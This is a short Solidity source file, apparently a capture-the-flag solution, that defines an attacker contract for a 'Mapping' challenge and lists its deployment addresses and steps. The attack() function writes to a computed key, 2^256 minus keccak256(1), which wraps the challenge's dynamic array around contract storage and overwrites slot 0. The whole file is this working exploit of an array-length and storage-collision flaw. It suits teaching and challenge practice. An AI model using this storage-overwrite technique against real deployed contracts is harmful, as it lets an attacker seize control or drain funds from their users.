// Challenge contract deployed at address: 0x528d9a15FF77D2ACF5dE88B36a411be40ABaF265
// 1 - Deploy the contract - 0x2475F6022084EB5ae9931A22b4247bA8D66cE666
// 2 - Call attack()

pragma solidity ^0.4.21;

interface IMappingChallenge {
    function set(uint256 key, uint256 value) external;
}

contract MappingChallengeAttacker {
    IMappingChallenge public challenge;

    function MappingChallengeAttacker(address challengeAddress) public {
        challenge = IMappingChallenge(challengeAddress); //
    }

    function attack() public {
        challenge.set((2**256 - 1) - uint256(keccak256(uint256(0x01))) + 1, 1);
    }
}
